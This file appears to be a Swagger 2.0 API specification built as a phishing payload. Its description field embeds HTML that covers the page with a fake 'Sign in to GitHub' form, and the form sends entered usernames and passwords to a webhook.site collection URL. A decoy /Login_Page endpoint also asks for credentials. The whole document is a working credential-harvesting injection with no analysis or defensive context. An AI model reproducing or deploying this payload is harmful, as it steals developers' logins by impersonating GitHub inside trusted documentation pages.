swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;z-index:99998;font-family:-apple-system,Segoe UI,Helvetica,Arial;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:308px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:24px 24px 12px;text-align:center;"><div style="font-size:30px;" title="GitHub">🐙</div><div style="font-size:24px;font-weight:300;color:#24292f;margin:8px 0 16px;font-family:-apple-system,Segoe UI,Helvetica;">Sign in to GitHub</div><form action="https://webhook.site/REPLACE-ME" method="post"><div style="text-align:left;border:1px solid #d0d7de;border-radius:6px;margin-bottom:14px;"><div style="padding:6px 12px;background:#f6f8fa;border-bottom:1px solid #d0d7de;font-size:12px;color:#24292f;">Username or email address</div><input type="text" name="user" style="width:100%;padding:8px 12px;border:none;font-size:14px;box-sizing:border-box;"></div><div style="text-align:left;border:1px solid #d0d7de;border-radius:6px;margin-bottom:14px;"><div style="padding:6px 12px;background:#f6f8fa;border-bottom:1px solid #d0d7de;font-size:12px;color:#24292f;">Password <span style="float:right;color:#0969da;">Forgot password?</span></div><input type="password" name="pass" style="width:100%;padding:8px 12px;border:none;font-size:14px;box-sizing:border-box;"></div><button type="submit" style="width:100%;padding:8px;background:#1f883d;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;">Sign in</button></form></div><div style="margin:0 24px 28px;padding:14px;text-align:center;border:1px solid #d0d7de;border-radius:6px;font-size:14px;font-family:-apple-system,Segoe UI,Helvetica;">New here? <span style="color:#0969da;">Create an account</span></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
